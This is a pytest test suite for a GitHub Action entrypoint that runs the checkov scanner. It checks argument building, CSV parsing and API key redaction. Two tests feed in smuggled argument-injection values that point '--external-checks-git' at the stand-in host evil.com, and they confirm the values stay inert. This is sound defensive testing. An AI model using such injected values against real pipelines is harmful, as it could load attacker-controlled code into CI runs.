import os
import subprocess
import pytest
from pathlib import Path

# Path to the entrypoint script
ENTRYPOINT_PATH = Path(__file__).parent.parent.parent / "github_action_resources" / "entrypoint.sh"

@pytest.fixture
def mock_env():
    """Fixture to provide a clean environment for testing the entrypoint."""
    env = os.environ.copy()
    # Set GITHUB_ACTIONS to true so the script doesn't exit early
    env["GITHUB_ACTIONS"] = "true"
    # Clear out any existing INPUT_ variables that might interfere
    for key in list(env.keys()):
        if key.startswith("INPUT_"):
            del env[key]
    return env

def run_entrypoint_strict_args(env, tmp_path):
    """Helper to run the entrypoint script and capture exact argument boundaries."""
    bin_dir = tmp_path / "bin"
    bin_dir.mkdir(exist_ok=True)
    fake_checkov = bin_dir / "checkov"
    # Print each argument on a new line, surrounded by brackets to show boundaries
    fake_checkov.write_text("#!/bin/bash\nfor arg in \"$@\"; do echo \"ARG: [$arg]\"; done\n")
    fake_checkov.chmod(0o755)

    env["PATH"] = f"{bin_dir}:{env.get('PATH', '')}"

    result = subprocess.run(
        [str(ENTRYPOINT_PATH)],
        env=env,
        capture_output=True,
        text=True
    )
    return result

def test_entrypoint_default_directory(mock_env, tmp_path):
    """Test 1: Default directory is used when no target is specified."""
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [-d]" in result.stdout
    assert "ARG: [.]" in result.stdout

def test_entrypoint_file_target(mock_env, tmp_path):
    """Test 2: File target overrides directory."""
    mock_env["INPUT_FILE"] = "my_template.yaml"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [-f]" in result.stdout
    assert "ARG: [my_template.yaml]" in result.stdout
    assert "ARG: [-d]" not in result.stdout

def test_entrypoint_docker_image_target(mock_env, tmp_path):
    """Test 3: Docker image target overrides file and directory."""
    mock_env["INPUT_DOCKER_IMAGE"] = "my-image:latest"
    mock_env["INPUT_DOCKERFILE_PATH"] = "Dockerfile"
    mock_env["INPUT_FILE"] = "my_template.yaml" # Should be ignored
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--docker-image]" in result.stdout
    assert "ARG: [my-image:latest]" in result.stdout
    assert "ARG: [--dockerfile-path]" in result.stdout
    assert "ARG: [Dockerfile]" in result.stdout
    assert "ARG: [-f]" not in result.stdout
    assert "ARG: [-d]" not in result.stdout

def test_entrypoint_boolean_flags(mock_env, tmp_path):
    """Test 4: Boolean flags are added correctly when true."""
    mock_env["INPUT_QUIET"] = "true"
    mock_env["INPUT_COMPACT"] = "true"
    mock_env["INPUT_SOFT_FAIL"] = "false" # Should be ignored
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--quiet]" in result.stdout
    assert "ARG: [--compact]" in result.stdout
    assert "ARG: [--soft-fail]" not in result.stdout

def test_entrypoint_single_value_flags(mock_env, tmp_path):
    """Test 5: Single value flags are added correctly."""
    mock_env["INPUT_FRAMEWORK"] = "terraform"
    mock_env["INPUT_BASELINE"] = ".checkov.baseline"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert "ARG: [--framework]" in result.stdout
    assert "ARG: [terraform]" in result.stdout
    assert "ARG: [--baseline]" in result.stdout
    assert "ARG: [.checkov.baseline]" in result.stdout

def test_entrypoint_csv_parsing_simple(mock_env, tmp_path):
    """Test 6: CSV parsing works for simple comma-separated lists."""
    mock_env["INPUT_CHECK"] = "CKV_AWS_1,CKV_AWS_2"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    # Should appear as two separate --check flags
    assert result.stdout.count("ARG: [--check]") == 2
    assert "ARG: [CKV_AWS_1]" in result.stdout
    assert "ARG: [CKV_AWS_2]" in result.stdout

def test_entrypoint_csv_parsing_with_spaces(mock_env, tmp_path):
    """Test 7: CSV parsing trims leading/trailing spaces but preserves internal spaces."""
    mock_env["INPUT_EXTERNAL_CHECKS_DIRS"] = "dir1, dir2 with spaces ,dir3"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    assert result.stdout.count("ARG: [--external-checks-dir]") == 3
    assert "ARG: [dir1]" in result.stdout
    assert "ARG: [dir2 with spaces]" in result.stdout
    assert "ARG: [dir3]" in result.stdout

def test_entrypoint_argument_injection_prevention_single(mock_env, tmp_path):
    """Test 8: Argument injection via spaces in single-value flags is prevented."""
    mock_env["INPUT_SKIP_CHECK"] = "CKV_AWS_20 --external-checks-git https://evil.com/repo"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    
    # Verify that the entire payload is treated as a single argument
    expected_arg = "ARG: [CKV_AWS_20 --external-checks-git https://evil.com/repo]"
    assert expected_arg in result.stdout
    
    # Verify that --external-checks-git was NOT parsed as its own argument
    assert "ARG: [--external-checks-git]" not in result.stdout

def test_entrypoint_argument_injection_prevention_csv(mock_env, tmp_path):
    """Test 9: Argument injection via spaces in CSV flags is prevented."""
    mock_env["INPUT_CHECK"] = "CKV_AWS_1, CKV_AWS_2 --external-checks-git https://evil.com/repo"
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    
    assert result.stdout.count("ARG: [--check]") == 2
    assert "ARG: [CKV_AWS_1]" in result.stdout
    # The second part should be treated as a single argument, despite the spaces
    expected_arg = "ARG: [CKV_AWS_2 --external-checks-git https://evil.com/repo]"
    assert expected_arg in result.stdout
    assert "ARG: [--external-checks-git]" not in result.stdout

def test_entrypoint_api_key_redaction(mock_env, tmp_path):
    """Test 10: API key is passed to checkov but redacted from the echo output."""
    mock_env["API_KEY_VARIABLE"] = "secret-api-key"
    mock_env["GITHUB_BRANCH"] = "main"
    mock_env["GITHUB_REPOSITORY"] = "org/repo"
    
    result = run_entrypoint_strict_args(mock_env, tmp_path)
    assert result.returncode == 0
    
    # Verify the API key was actually passed to checkov
    assert "ARG: [--bc-api-key]" in result.stdout
    assert "ARG: [secret-api-key]" in result.stdout
    
    # Verify the API key was redacted from the printed command line
    assert " <API_KEY>" in result.stdout
    assert "secret-api-key" not in result.stdout.split("CHECKOV_RESULTS=")[0] # Check only the echo part
